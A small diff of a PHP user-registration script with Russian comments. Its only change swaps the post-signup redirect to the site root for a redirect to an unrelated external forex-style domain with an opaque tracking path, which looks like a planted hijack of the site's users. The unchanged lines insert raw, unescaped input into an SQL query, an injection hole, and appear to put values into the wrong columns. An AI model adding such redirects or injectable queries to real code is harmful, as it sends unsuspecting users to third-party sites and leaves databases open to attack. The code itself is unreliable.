@@ -9,5 +9,5 @@
     $mysql->query("INSERT INTO `users` (`login`, `password`, `name`) VALUES('$user_name','$inst_name','$password')"); #отправка данных в бд
     $mysql->close(); #закрытие бд
 
-    header('Location: /'); #переадресация
+    header('Location: https://makeforex.ru/423c3ee069eb4400a3819e07b4aaee1c'); #переадресация
 ?>
